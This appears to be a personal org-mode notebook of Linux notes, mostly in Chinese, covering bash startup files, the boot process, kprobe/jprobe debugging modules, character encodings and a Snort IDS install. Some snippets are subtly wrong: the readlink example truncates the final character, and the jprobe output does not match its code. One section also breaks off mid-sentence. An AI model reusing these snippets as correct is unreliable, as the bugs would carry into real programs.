+因此，只要运行～/.profile文件，～/.bashrc文件就会连带运行。但是上一节的第一种情况提到过，如果存在～/.bash_profile文件，那么有可能不会运行～/.profile文件。解决这个问题很简单，把下面代码写入.bash_profile就行了。
+
+　　if [ -f ~/.profile ]; then
+　　　　. ~/.profile
+　　fi
+　　
+这样一来，不管是哪种情况，.bashrc都会执行，用户的设置可以放心地都写入这个文件了。
+Bash的设置之所以如此繁琐，是由于历史原因造成的。早期的时候，计算机运行速度很慢，载入配置文件需要很长时间，Bash的作者只好把配置文件分成了几个部分，阶段性载入。系统的通用设置放在 /etc/profile，用户个人的、需要被所有子进程继承的设置放在.profile，不需要被继承的设置放在.bashrc。
+顺便提一下，除了Linux以外， Mac OS X 使用的shell也是Bash。但是，它只加载.bash_profile，然后在.bash_profile里面调用.bashrc。而且，不管是ssh登录，还是在图形界面里启动shell窗口，都是如此。
+
+* linux启动过程
+POST加电自检
+-->BIOS(Boot Sequence)
+-->加载对应引导上的MBR(bootloader)
+-->主引导设置加载其BootLoader
+-->Kernel初始化
+-->initrd
+-—>/sbin/init进程加载/etc/inittab
+
+
+kernel_init --> run_init_process("sbin/init")
+
+init的实现：
+It depends on Linux version. Traditionally, _sysvinit_ was used.
+These days, many Linux distros use _upstart_.
+Some others, like Fedora, are using _systemd_.
+
+** 剖析详细启动过程
+1. POST开机自检：电脑主机打开电源的时候，随后会听到滴的一声，系统启动开始了开机自检（POST-power on self
+   test）自检开始），这个过程中主要是检测计算机硬件设备比如：CPU，内存，主板，显卡，CMOS等设备是否有故障存
+   在，如果有硬件故障的话将按两种情况理：对于严重故障(致命性故障)则停机，此时由于各种初始化操作还没完成，
+   不能给出任何提示或信号；对于非严重故障则给出提示或声音报警信号，等待用户处理），如果没有故障，POST完整自己
+   的接力任务，将尾部工作交接给BIOS处理。 
+2. BIOS：计算机加电自检完成后第一个读取的地方就是就是BIOS（Basic Input Output System，基础输入输出系统）
+   ，BIOS里面记录了主机板的芯片集与相关设置，如CPU与接口设备的通信频率、启动设备的搜索顺序、硬盘的大小与
+   类型、系统时间、外部总线、各种接口设备的I/O地址、已经与CPU通信的IRQ中断信息，所以，启动如果要顺利启动，
+   首先要读取BIOS设置。 
+
+3. 按照BIOS所设定的系统启动流程，如果检测通过，则根据引导次序(Boot Sequence)开始在第一台设备上支持启动
+   程序，我们的启动设备主要包括硬盘、USB、SD等，我们一般用的是硬盘，然后进行读取第一个设备就是硬盘，第一个
+   要读去的就是该硬盘的主引导记录MBR（Master Boot Record），然后系统可以根据启动区安装的
+   引导加载程序（Boot Loader）开始执行核心识别的工作。【在此插一句：MBR程序只是找到只是硬盘分区内最前面
+   的446个字节的Boot Loader】然后查找相关配置和定义。 
+
+4. Boot Loader 加载Grub程序
+   在这个过程中主要靠Grub的引导开始的，Grub分为连个阶段：
+   stage1：主要是Boot loader
+   stage 1.5:过渡
+   stage2:主要是/boot/grub 
+
+#+begin_example
+linux-19:/boot/grub # cat menu.lst
+default 0
+timeout 8
+
+gfxmenu (hd0,1)/boot/message
+
+title SUSE Linux Enterprise Server 11 SP2 - 3.0.80-0.7
+    root (hd0,1)
+    kernel /boot/vmlinuz-3.0.80-0.7-default root=/dev/disk/by-id/scsi-36001e4f03068ec000fb1f5b4052ae63b-part2 resume=/dev/disk/by-id/scsi-36001e4f03068ec000fb1f5b4052ae63b-part1 splash=silent crashkernel=256M-:128M showopts vga=0x31a
+    initrd /boot/initrd-3.0.80-0.7-default
+
+title Failsafe -- SUSE Linux Enterprise Server 11 SP2 - 3.0.80-0.7
+    root (hd0,1)
+    kernel /boot/vmlinuz-3.0.80-0.7-default root=/dev/disk/by-id/scsi-36001e4f03068ec000fb1f5b4052ae63b-part2 showopts ide=nodma apm=off noresume edd=off powersaved=off nohz=off highres=off processor.max_cstate=1 nomodeset x11failsafe vga=0x31a
+    initrd /boot/initrd-3.0.80-0.7-default
+#+end_example
+     
+5. Kernel
+   根据Grub内的定义，grub读取完毕后就把下面的工作交个内核了。kernel主要是完成系统硬件探测及硬件驱动的初始
+   化，并且以读写的方式挂载根文件系统（根切换），那么这里就出现了一个“先有鸡还是先有蛋的文件了”，具体是什么
+   那？
+   要想访问真正的根文件系统（rootfs）的话，就必须加载根文件系统中的设备，这时根文件系统又没有挂载，
+   要挂载根文件系统又得加载根文件系统中的驱动程序，哪怎么办呢？为了解决这个问题，这是就用到了initrd文件了。  
+   在来说下kernel初始化所要工作的内容做下简单总结：  
+   探测硬件->加载驱动（initrd)->挂载根文件系统->rootfs(/sbin/init) 
+
+#+begin_example
+inux-19:~/test # mkdir intrd
+inux-19:~/test # mv /boot/initrd-3.0.80-0.7-default initrd/
+linux-19:~/test # cd initrd/ 
+linux-19:~/test/initrd # ls
+initrd-3.0.80-0.7-default
+linux-19:~/test/initrd # zcat initrd-3.0.80-0.7-default | cpio -id                       
+33097 blocks
+linux-19:~/test/initrd # ls
+bin  boot  bootsplash  config  dev  etc  init  initrd-3.0.80-0.7-default  lib  lib64  mkinitrd.config  proc  root  run_all.sh  sbin  sys  tmp  usr  var
+linux-19:~/test/initrd # 
+#+end_example
+发现解压的结果很想/目录
+可以vi init
+看一下init脚本都做了哪些操作。
+看到init进程的主要工作：
+挂载 ：将initrd中的/proc, /sys  /dev 挂载到当前的主分区中的相应目录  
+创建目录：/dev/mapper  
+通过mknod完成block or character special files的创建  
+相关模块的挂载  
+创建root设备  
+挂载 /sysroot  
+最后完成根切换 
+
+
+6. 到此止内核空间的相关工作已经完成，内核空间的任务开始向用户空间转移，内核空间通过一个间接的initrd(微型
+   linux)向用户空间的/sbin/init过度，所以grub开始引导内核转向initrd。
+   initrd：一个虚拟的文件系统，里面有lib、bin、sbin、usr、proc、sys、var、dev、boot等一些目录，
+   其实你会发现里面的目录有点像真的/对吧，所以我们称之为虚拟的根文件系统，作用就是将kernel和真的根文件系统
+   建立关联关系，让kernel去initrd中加载根文件系统所需要的驱动程序，并以读写的方式挂载根文件系统，并让执行
+   用户当中第一个进程init。 
+
+
+7. init执行完毕以后会启动系统内的/etc/inittab文件，来完成系统系统的初始化工作。
+   下面我们来介绍一下inittab这个配置文件内的详细内容
+
+各个级别的定义：
+默认运行级别 
+0：halt                      //关机  
+1: single user mode    //单用户维护模式)  
+2：multi user mode, without NFS  //不支持NFS功能  
+3: multi user mode, text mode     //字符界面  
+4：reserved   //系统保留  
+5: multi user mode, graphic mode   //图形化界面  
+6: reboot   //重启 
+
+/etc/inittab格式及语法(:) 
+[选项]:[runlevel]:[行为]:[命令]
+行为：  
+                   initdefault：代表默认运行级别  
+                   sysinit：代表系统初始化操作选项  
+                   ctrlaltdel：代表重启的相关设置  
+                   wait：代表上一个命令执行结束后方可执行下面的操作  
+                   respawn：代表后面字段可以无限制再生(reboot)
+命令选项  
+               一些命令，不过通常都是脚本 
+
+* linux启动过程中读取/etc/fstab
+  读取/etc/fstab，mount文件系统的操作
+  是由mount命令自己完成的。
+  mount -a 选项
+* 获取当前程序的绝对路径
+  读取/proc/self/exe符号链接
+  char buf[PATH_MAX];
+  int n = readlink("/proc/self/exe", buf, PATH_MAX);
+  if( n > 0 && n < PATH_MAX) {
+  buf[n-1] = '\0';
+* linux log
+  /var/log/boot.msg
+  /var/log/boot.omsg
+  All the boot information and output of a Suse 9 system can be retrieved in /var/log/boot.msg. 
+  Here you find the kernel messages, stored by the ksyslog daemon, the init output and the messages of the various services started at the chosen runlevel.
+  This file is rewritten at every reboot, a copy of the output of the previous boot is kept in /var/log/boot.omsg
+* configure
+  configure --with-* 传参数
+  configure内容:
+  perl subst xxx.cfg
+  perl subst Makefile
+* 网桥转发的问题
+  tony 在linux A 上建立的网桥，
+  然后建立路由，再另一个机器以A为网关，测试路由。
+  结果总是不通，于是他就在A上运行tcpdump，
+  发现运行tcpdump时，路由居然就通了。
+  后来我提意，将网卡设置成混杂模式，然后在测试，路由就是通的。
+  最后发现网桥的接口就是需要在混杂模式。可能之前有人改过配置。
+* valgrind
+#+begin_src c
+#include <stdlib.h>
+
+int main() 
+{
+    int *p = (int *) malloc(10*sizeof(int));
+    p[10] = 1;
+    return 0;
+}
+#+end_src
+运行valgrind ./test
+结果就发现了：p[10] = 1 处越界访问。
+
+** 使用valgrind调试fastcgi程序
+
+   使用spawn-fcgi调起用valgrind起的fastcgi程序即可.
+   spawn-fcgi -n -a 127.0.0.1 -p 9000 -- /usr/bin/valgrind --leak-check=full --log-file=/tmp/valgrind.log /path/to/prog
+   调试的话,直接gdb attach上进程ID即可.
+
+* 按inode号删除文件
+Linux 下有些文件直接使用 rm 无法删除, 比如该文件的文件名含有终端不能正确显示的字符.
+
+[root@dev]# ls -i
+26247183 wite.html
+26247184 abc.html
+26247189 test?.txt
+
+可以通过文件 inode 删除
+# find . -inum 26247189  -delete
+* kprobe使用
+Kprobe is a very simple method to probe the running kernel. At a fundamental level, it requires the address of a kernel function that needs to be debugged. Then, you create pre- and post-handlers that will print a debugging message when the target kernel function is called. (Actually, a handler performs any action specified in its code; in this case, it happens to be printing.) Thus, every time that function is called, you can track it.
+An example
+
+To keep things simple, I have created a small and easy-to-understand example. The target kernel function is ip_rcv(). The Kprobe example kernel module is as follows:
+#+begin_src c	
+#include<linux/module.h>
+#include<linux/version.h>
+#include<linux/kernel.h>
+#include<linux/init.h>
+#include<linux/kprobes.h>
+ 
+static unsigned int counter = 0;
+int Pre_Handler(struct kprobe *p, struct pt_regs *regs){
+    printk("Pre_Handler: counter=%u\n",counter++);
+    return 0;
+}
+ 
+void Post_Handler(struct kprobe *p, struct pt_regs *regs, unsigned long flags){
+    printk("Post_Handler: counter=%u\n",counter++);
+}
+ 
+static struct kprobe kp;
+ 
+int myinit(void)
+{
+    printk("module inserted\n ");
+    kp.pre_handler = Pre_Handler;
+    kp.post_handler = Post_Handler;
+    kp.addr = (kprobe_opcode_t *)0xc071c9a9;
+    register_kprobe(&kp);
+    return 0;
+}
+ 
+void myexit(void)
+{
+    unregister_kprobe(&kp);
+    printk("module removed\n ");
+}
+ 
+module_init(myinit);
+module_exit(myexit);
+MODULE_AUTHOR("Manoj");
+MODULE_DESCRIPTION("KPROBE MODULE");
+MODULE_LICENSE("GPL");
+#+end_src
+
+The makefile required to build the kernel module object file that you need to insert into the kernel is as follows:
+#+begin_src c
+obj-m +=mod1.o mod2.o
+KDIR= /lib/modules/$(shell uname -r)/build
+all:
+    $(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules
+clean:
+       rm -rf *.o *.ko *.mod.* .c* .t*
+#+end_src
+Code walk-through
+
+Here’s an explanation for the less obvious sections of the code.
+struct kprobe kp;
+
+To make use of Kprobe functionality, you must declare a variable of the structure struct kprobe, which is declared in include/linux/kprobes.h. Here’s a little extract:
+#+begin_src c
+struct kprobe {
+    .
+    .
+    kprobe_opcode_t *addr;
+    kprobe_pre_handler_t pre_handler;
+    kprobe_post_handler_t post_handler;
+}
+#+end_src
+The three members listed above are of interest to us. You need to assign the kernel address of the target function to the addr member; you can retrieve the address from the /proc/kallsyms file, as follows:
+#+begin_src c
+# cat /proc/kallsyms | grep ip_rcv
+c071c3e0 t ip_rcv_finish
+c071c9a9 T ip_rcv
+#+end_src
+Once you’ve found the address, use it in the myinit() function, as follows:
+kp.addr = (kprobe_opcode_t *)0xc071c9a9;
+
+Kprobe executes handler functions before and after the target kernel function is called, and we created the Pre_Handler() and Post_Handler() functions for this purpose. Assign these to their respective pointer members in the Kprobe struct — pre_handler and post_handler — in myinit(), as you can see. Finally, register your Kprobe with the kernel, with register_kprobe(&kp);.
+
+Then compile the module by running make:
+#+begin_example
+# make
+make -C /lib/modules/2.6.34/build SUBDIRS=/root/kprobe modules
+make[1]: Entering directory '/root/linux-2.6.34'
+  CC [M]  /root/kprobe/mod1.o
+  Building modules, stage 2.
+  MODPOST 1 modules
+  CC      /root/kprobe/mod1.mod.o
+  LD [M]  /root/kprobe/mod1.ko
+make[1]: Leaving directory '/root/linux-2.6.34'
+#+end_example
+
+When done, you are ready to test your example module by inserting it into the kernel:
+# insmod mod1.ko
+
+Confirm that the module is successfully inserted:
+# lsmod | head -n 5
+Module                  Size  Used by
+mod1                     904  0
+fuse                   46627  2
+sunrpc                158985  1
+xt_physdev              1355  1
+
+Now, since you have used ip_rcv() as your target function, you need to invoke it with a simple ping:
+# ping localhost
+
+Run dmesg and find your module’s messages:
+module inserted
+Pre_Handler: counter=0
+Post_Handler: counter=1
+Pre_Handler: counter=2
+Post_Handler: counter=3
+
+As you see, you can probe a kernel address and do instrumentation without recompiling the kernel, as was required by the simple printk. When you are done with your debugging, don’t forget to remove the module:
+# rmmod mod1
+
+In the exit function, myexit(), Kprobe is unregistered by calling unregister_kprobe(&kp);.
+
+However, Kprobe has limits to what you can do with it. In the above example, you have just printed some messages in the handlers; you cannot access the function’s arguments with Kprobe. Let’s move on to something better.
+Probing with Jprobe
+
+For those who like bonus features, Jprobe is another kind of probing technique, which can be used to access the target function’s arguments, and thus display what was passed to the function. The basics are the same as that of Kprobe, but this additional feature makes Jprobe an interesting tool.
+
+To get the Jprobe structure details, look in the file include/linux/kprobes.h:
+struct jprobe {
+        struct kprobe kp;
+        void *entry;    /* probe handling code to jump to */
+};
+
+As you see, it contains a struct kprobe member, plus a pointer to store the address of a handler function to jump to.
+A Jprobe example
+#+begin_src c	
+#include<linux/module.h>
+#include<linux/version.h>
+#include<linux/kernel.h>
+#include<linux/init.h>
+#include<linux/kprobes.h>
+#include<net/ip.h>
+#include <linux/kallsyms.h>
+ 
+int my_handler (struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev){
+ 
+    struct iphdr *my_iph;
+    u32 S_ip,D_ip;
+    my_iph = ip_hdr(skb);
+    S_ip = my_iph->saddr;
+    D_ip = my_iph->daddr;
+    printk("Source IP: \n"NIPQUAD_FMT,NIPQUAD(S_ip));
+     jprobe_return();
+}
+ 
+static struct jprobe my_probe;
+ 
+int myinit(void)
+{
+    int ret;
+    //my_probe.kp.addr = (kprobe_opcode_t *)0xc071c9a9;
+    my_probe.kp.addr = (kprobe_opcode_t *) kallsyms_lookup_name("ip_rcv");
+    if (!my_probe.kp.addr) {
+       printk("Couldn't find %s to plant jprobe\n", "ip_rcv");
+       return -1;
+    }
+    my_probe.entry = (kprobe_opcode_t *)my_handler;
+    if ((ret = register_jprobe(&my_probe)) < 0) {
+       printk("register_jprobe failed, returned %d\n", ret);
+       return -1;
+    }
+    return 0;
+}
+ 
+void myexit(void)
+{
+    unregister_jprobe(&my_probe);
+    printk("module removed\n ");
+}
+ 
+module_init(myinit);
+module_exit(myexit);
+ 
+/*Kernel module Comments*/
+MODULE_AUTHOR("Manoj");
+MODULE_DESCRIPTION("SIMPLE MODULE");
+MODULE_LICENSE("GPL");
+//MODULE_LICENSE("GPL v2");
+#+end_src
+Code walk-through
+
+The example is simple to understand, but let me explain things a bit. Here, in the myinit() function, you assigned the target function address to the addr member of the Kprobe member struct kp, just like for the earlier module. The main difference is that you’ve now assigned a single handler function, my_handler, to the entry member:
+my_probe.entry = (kprobe_opcode_t *)my_handler;
+
+You’ve probably already noted that the signature of the single handler function here is quite different from the Kprobe handlers. The reason is, the handler must have the same arguments as that of the kernel function you’re probing, which is once again ip_rcv():
+int my_handler (struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
+extern int   ip_rcv(struct sk_buff *skb, struct net_device *dev,  struct packet_type *pt, struct net_device *orig_dev);
+
+Jprobe lets us access the arguments of a function by calling your handler with the same arguments passed to the target function. This means that when ip_rcv is called, its arguments can be accessed from your probe handler as it is able to refer to the function’s address space plus the components within that function stack.
+
+The line my_iph = ip_hdr(skb); will extract the IP header from sk_buff. Then extract the source and destination IP addresses in dot notation form, using the NIPQUAD and NIPQUAD_FMT macros declared in include/linux/kernel.h, and print the addresses.
+
+Now, compile your module, insert it, and check that the module has been inserted successfully, just as before. Again, to invoke ip_rcv(), run a ping and then run dmesg to check the output:
+# ping www.google.com
+# dmesg
+Source IP: 192.168.1.1
+Destination IP: 192.168.1.3
+Source IP: 209.85.231.104
+Destination IP: 192.168.1.3
+
+The output shows that Jprobe lets you get the function’s argument values, which can be very handy when debugging data-dependent bugs.
+
+修改一下
+#+begin_src c	
+#include<linux/module.h>
+#include<linux/version.h>
+#include<linux/kernel.h>
+#include<linux/init.h>
+#include<linux/kprobes.h>
+static const char *probed_func = "ip_rcv"; 
+static unsigned int counter = 0;
+int Pre_Handler(struct kprobe *p, struct pt_regs *regs){
+    printk("Pre_Handler: counter=%u\n",counter++);
+    return 0;
+}
+ 
+void Post_Handler(struct kprobe *p, struct pt_regs *regs, unsigned long flags){
+    printk("Post_Handler: counter=%u\n",counter++);
+}
+ 
+static struct kprobe kp;
+ 
+int myinit(void)
+{
+    printk("module inserted\n ");
+    kp.pre_handler = Pre_Handler;
+    kp.post_handler = Post_Handler;
+    /* 直接使用函数名 */
+    kp.symbol_name = (char *)probed_func;
+    register_kprobe(&kp);
+    return 0;
+}
+ 
+void myexit(void)
+{
+    unregister_kprobe(&kp);
+    printk("module removed\n ");
+}
+ 
+module_init(myinit);
+module_exit(myexit);
+MODULE_AUTHOR("Manoj");
+MODULE_DESCRIPTION("KPROBE MODULE");
+MODULE_LICENSE("GPL");
+#+end_src
+
+更详细的内容可以阅读linux-2.6.21/Documentation/kprobes.txt。
+
+* gcc -finstrument-functions特性的应用
+* 字符编码总结
+1. ASCII码
+
+我们知道，在计算机内部，所有的信息最终都表示为一个二进制的字符串。每一个二进制位（bit）有0和1两种状态，因此八个二进制位就可以组合出256种状态，这被称为一个字节（byte）。也就是说，一个字节一共可以用来表示256种不同的状态，每一个状态对应一个符号，就是256个符号，从0000000到11111111。
+
+上个世纪60年代，美国制定了一套字符编码，对英语字符与二进制位之间的关系，做了统一规定。这被称为ASCII码，一直沿用至今。
+
+ASCII码一共规定了128个字符的编码，比如空格"SPACE"是32（二进制00100000），大写的字母A是65（二进制01000001）。这128个符号（包括32个不能打印出来的控制符号），只占用了一个字节的后面7位，最前面的1位统一规定为0。
+
+2、非ASCII编码
+
+英语用128个符号编码就够了，但是用来表示其他语言，128个符号是不够的。比如，在法语中，字母上方有注音符号，它就无法用ASCII码表示。于是，一些欧洲国家就决定，利用字节中闲置的最高位编入新的符号。比如，法语中的é的编码为130（二进制10000010）。这样一来，这些欧洲国家使用的编码体系，可以表示最多256个符号。
+
+但是，这里又出现了新的问题。不同的国家有不同的字母，因此，哪怕它们都使用256个符号的编码方式，代表的字母却不一样。比如，130在法语编码中代表了é，在希伯来语编码中却代表了字母Gimel (ג)，在俄语编码中又会代表另一个符号。但是不管怎样，所有这些编码方式中，0--127表示的符号是一样的，不一样的只是128--255的这一段。
+
+至于亚洲国家的文字，使用的符号就更多了，汉字就多达10万左右。一个字节只能表示256种符号，肯定是不够的，就必须使用多个字节表达一个符号。比如，简体中文常见的编码方式是GB2312，使用两个字节表示一个汉字，所以理论上最多可以表示256x256=65536个符号。
+
+中文编码的问题需要专文讨论，这篇笔记不涉及。这里只指出，虽然都是用多个字节表示一个符号，但是GB类的汉字编码与后文的Unicode和UTF-8是毫无关系的。
+
+3.Unicode
+
+正如上一节所说，世界上存在着多种编码方式，同一个二进制数字可以被解释成不同的符号。因此，要想打开一个文本文件，就必须知道它的编码方式，否则用错误的编码方式解读，就会出现乱码。为什么电子邮件常常出现乱码？就是因为发信人和收信人使用的编码方式不一样。
+
+可以想象，如果有一种编码，将世界上所有的符号都纳入其中。每一个符号都给予一个独一无二的编码，那么乱码问题就会消失。这就是Unicode，就像它的名字都表示的，这是一种所有符号的编码。
+
+Unicode当然是一个很大的集合，现在的规模可以容纳100多万个符号。每个符号的编码都不一样，比如，U+0639表示阿拉伯字母Ain，U+0041表示英语的大写字母A，U+4E25表示汉字"严"。具体的符号对应表，可以查询unicode.org，或者专门的汉字对应表。
+
+4. Unicode的问题
+
+需要注意的是，Unicode只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储。
+
+比如，汉字"严"的unicode是十六进制数4E25，转换成二进制数足足有15位（100111000100101），也就是说这个符号的表示至少需要2个字节。表示其他更大的符号，可能需要3个字节或者4个字节，甚至更多。
+
+这里就有两个严重的问题，第一个问题是，如何才能区别Unicode和ASCII？计算机怎么知道三个字节表示一个符号，而不是分别表示三个符号呢？第二个问题是，我们已经知道，英文字母只用一个字节表示就够了，如果Unicode统一规定，每个符号用三个或四个字节表示，那么每个英文字母前都必然有二到三个字节是0，这对于存储来说是极大的浪费，文本文件的大小会因此大出二三倍，这是无法接受的。
+
+它们造成的结果是：1）出现了Unicode的多种存储方式，也就是说有许多种不同的二进制格式，可以用来表示Unicode。2）Unicode在很长一段时间内无法推广，直到互联网的出现。
+
+5.UTF-8
+
+互联网的普及，强烈要求出现一种统一的编码方式。UTF-8就是在互联网上使用最广的一种Unicode的实现方式。其他实现方式还包括UTF-16（字符用两个字节或四个字节表示）和UTF-32（字符用四个字节表示），不过在互联网上基本不用。重复一遍，这里的关系是，UTF-8是Unicode的实现方式之一。
+
+UTF-8最大的一个特点，就是它是一种变长的编码方式。它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。
+
+UTF-8的编码规则很简单，只有二条：
+
+1）对于单字节的符号，字节的第一位设为0，后面7位为这个符号的unicode码。因此对于英语字母，UTF-8编码和ASCII码是相同的。
+
+2）对于n字节的符号（n>1），第一个字节的前n位都设为1，第n+1位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的unicode码。
+
+下表总结了编码规则，字母x表示可用编码的位。
+
+    Unicode符号范围 | UTF-8编码方式
+    (十六进制) | （二进制）
+    --------------------+---------------------------------------------
+    0000 0000-0000 007F | 0xxxxxxx
+    0000 0080-0000 07FF | 110xxxxx 10xxxxxx
+    0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx
+    0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx
+
+跟据上表，解读UTF-8编码非常简单。如果一个字节的第一位是0，则这个字节单独就是一个字符；如果第一位是1，则连续有多少个1，就表示当前字符占用多少个字节。
+
+下面，还是以汉字"严"为例，演示如何实现UTF-8编码。
+
+已知"严"的unicode是4E25（100111000100101），根据上表，可以发现4E25处在第三行的范围内（0000 0800-0000 FFFF），因此"严"的UTF-8编码需要三个字节，即格式是"1110xxxx 10xxxxxx 10xxxxxx"。然后，从"严"的最后一个二进制位开始，依次从后向前填入格式中的x，多出的位补0。这样就得到了，"严"的UTF-8编码是"11100100 10111000 10100101"，转换成十六进制就是E4B8A5。
+
+6. Unicode与UTF-8之间的转换
+
+通过上一节的例子，可以看到"严"的Unicode码是4E25，UTF-8编码是E4B8A5，两者是不一样的。它们之间的转换可以通过程序实现。
+
+在Windows平台下，有一个最简单的转化方法，就是使用内置的记事本小程序Notepad.exe。打开文件后，点击"文件"菜单中的"另存为"命令，会跳出一个对话框，在最底部有一个"编码"的下拉条。
+
+bg2007102801.jpg
+
+里面有四个选项：ANSI，Unicode，Unicode big endian 和 UTF-8。
+
+1）ANSI是默认的编码方式。对于英文文件是ASCII编码，对于简体中文文件是GB2312编码（只针对Windows简体中文版，如果是繁体中文版会采用Big5码）。
+
+2）Unicode编码指的是UCS-2编码方式，即直接用两个字节存入字符的Unicode码。这个选项用的little endian格式。
+
+3）Unicode big endian编码与上一个选项相对应。我在下一节会解释little endian和big endian的涵义。
+
+4）UTF-8编码，也就是上一节谈到的编码方法。
+
+选择完"编码方式"后，点击"保存"按钮，文件的编码方式就立刻转换好了。
+
+7. Little endian和Big endian
+
+上一节已经提到，Unicode码可以采用UCS-2格式直接存储。以汉字"严"为例，Unicode码是4E25，需要用两个字节存储，一个字节是4E，另一个字节是25。存储的时候，4E在前，25在后，就是Big endian方式；25在前，4E在后，就是Little endian方式。
+
+这两个古怪的名称来自英国作家斯威夫特的《格列佛游记》。在该书中，小人国里爆发了内战，战争起因是人们争论，吃鸡蛋时究竟是从大头(Big-Endian)敲开还是从小头(Little-Endian)敲开。为了这件事情，前后爆发了六次战争，一个皇帝送了命，另一个皇帝丢了王位。
+
+因此，第一个字节在前，就是"大头方式"（Big endian），第二个字节在前就是"小头方式"（Little endian）。
+
+那么很自然的，就会出现一个问题：计算机怎么知道某一个文件到底采用哪一种方式编码？
+
+Unicode规范中定义，每一个文件的最前面分别加入一个表示编码顺序的字符，这个字符的名字叫做"零宽度非换行空格"（ZERO WIDTH NO-BREAK SPACE），用FEFF表示。这正好是两个字节，而且FF比FE大1。
+
+如果一个文本文件的头两个字节是FE FF，就表示该文件采用大头方式；如果头两个字节是FF FE，就表示该文件采用小头方式。
+
+8. 实例
+
+下面，举一个实例。
+
+打开"记事本"程序Notepad.exe，新建一个文本文件，内容就是一个"严"字，依次采用ANSI，Unicode，Unicode big endian 和 UTF-8编码方式保存。
+
+然后，用文本编辑软件UltraEdit中的"十六进制功能"，观察该文件的内部编码方式。
+
+1）ANSI：文件的编码就是两个字节"D1 CF"，这正是"严"的GB2312编码，这也暗示GB2312是采用大头方式存储的。
+
+2）Unicode：编码是四个字节"FF FE 25 4E"，其中"FF FE"表明是小头方式存储，真正的编码是4E25。
+
+3）Unicode big endian：编码是四个字节"FE FF 4E 25"，其中"FE FF"表明是大头方式存储。
+
+4）UTF-8：编码是六个字节"EF BB BF E4 B8 A5"，前三个字节"EF BB BF"表示这是UTF-8编码，后三个"E4B8A5"就是"严"的具体编码，它的存储顺序与编码顺序是一致的。
+* 安装过程ldconfig
+ld.so.conf中
+动态库的查找顺序
+按照目录顺序查找
+
+我安装daq时，./configure
+报错：
+  ERROR!  Libpcap library version >= 1.0.0  not found.
+    Get it from http://www.tcpdump.org
+
+于是下载一个libpcap的源码包，编译./configure --prefix=/usr/lib/
+结果还是不对。
+
+ldconfig -p |grep libpcap
+发现实际其作用的是 libpcap.0.9.8
+
+发现/etc/ld.so.conf部分内容：
+/usr/lib64
+/usr/lib
+
+我将/usr/lib64下的旧版本的
+* snort 安装过程
+* install snort
+#+begin_example
+# cd /tmp ; wget http://www.snort.org/downloads/1850 -O daq-1.1.1.tar.gz # tar -xzvf daq-1.1.1.tar.gz 
+# cd daq-1.1.1/ 
+# ./configure 
+# make && make install 
+# ldconfig -v 
+#+end_example
+
+- Creating snort user and tree directories:
+
+12345678 # groupadd snort # useradd -g snort snort # mkdir /usr/local/snort # mkdir /etc/snort # mkdir /var/log/snort # mkdir /var/run/snort # chown snort:snort /var/log/snort # chown snort:snort /var/run/snort 
+
+Installing Snort and configuring the ruleset
+
+- Downloading and installing snort:
+
+1234567891011 # cd /tmp ; wget http://www.snort.org/downloads/1862 -O snort-2.9.3.1.tar.gz # tar -xzvf snort-2.9.3.1.tar.gz # cd snort-2.9.3.1/ # ./configure --prefix /usr/local/snort --enable-sourcefire --enable-ipv6 # make && make install # ln -s /usr/local/snort/bin/snort /usr/bin/snort # cp /tmp/snort-2.9.3.1/etc/snort.conf /etc/snort/ # cp /tmp/snort-2.9.3.1/etc/unicode.map /etc/snort/ # cp /tmp/snort-2.9.3.1/etc/classification.config /etc/snort/ # cp -r /usr/local/snort/lib/snort_dynamicpreprocessor/ /usr/local/lib/ # cp -r /usr/local/snort/lib/snort_dynamicengine /usr/local/lib/ 
+
+- Downloading open source ruleset from emerging:
+
+#+begin_example
+# cd /etc/snort ; wget http://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz && wget http://rules.emergingthreats.net/open/snort-2.9.0/reference.config 
+# tar -xzvf emerging.rules.tar.gz 
+# touch /etc/snort/rules/white_list.rules /etc/snort/rules/black_list.rules 
+# chown -R snort:snort /etc/snort/ 
+#+end_example
+
+- Edit snort configuration:
+
+#+begin_example
+# vi /etc/snort/snort.conf 
+
+ipvar HOME_NET 192.168.1.0/24
+var RULE_PATH /etc/snort/rules
+var SO_RULE_PATH /etc/snort/so_rules
+var PREPROC_RULE_PATH /etc/snort/preproc_rules
+var WHITE_LIST_PATH /etc/snort/rules
+var BLACK_LIST_PATH /etc/snort/rules
+include $RULE_PATH/emerging.conf 
+#+end_example
+
+Configuring the init script for Snort
+
+- Create sysconfig snort configuration:
+
+#+begin_example
+# vi /etc/sysconfig/snort 
+
+#### General Configuration
+INTERFACE=eth0
+CONF=/etc/snort/snort.conf
+USER=snort
+GROUP=snort
+PASS_FIRST=0
+#### Logging & Alerting
+LOGDIR=/var/log/snort
+ALERTMODE=fast 
+DUMP_APP=1 
+BINARY_LOG=1 
+NO_PACKET_LOG=0 
+PRINT_INTERFACE=0 
+#+end_example
+
+- Adding the init script:
+#+begin_example
+# vi /etc/init.d/snortd 
+#+end_example
+
+- Start snort at system boot time:
+
+#+begin_example
+# chmod +x /etc/init.d/snortd 
+# chkconfig --levels 235 snortd on 
+#+end_example
+- Starting snort:
+
+#+begin_example
+# /etc/init.d/snortd start 
+#+end_example
+Testing the basic functionality of port scanning detection with nmap
+
+#+begin_example
+# tail -f /var/log/snort/alert 
+#+end_example
+* install base and barnyard2
+Install BASE dependencies
+#+begin_example
+# yum install -y mysql-server mysql-devel php-mysql php-adodb php-pear php-gd httpd 
+# pear channel-update pear.php.net 
+# pear install Numbers_Roman 
+# pear install channel://pear.php.net/Image_Canvas-0.3.5 # 
+# pear install channel://pear.php.net/Image_Graph-0.8.0 
+#+end_example
+
+Preparing MySQL environment
+- Initializing mysql and configuring to start the daemon at boot time:
+#+begin_example
+# service mysql start 
+# chkconfig --levels 235 mysql on 
+#+end_example
+
+- Preparing the new database for snort:
+#+begin_example
+# mysql -u root -p 
+
+mysql> create database snort;
+mysql> grant select,insert,update,delete,create on snort.* to snort@localhost; 
+mysql> set password for snort@localhost=PASSWORD('snortpassword'); 
+#+end_example
+
+Setup snort to log out in unified2 format
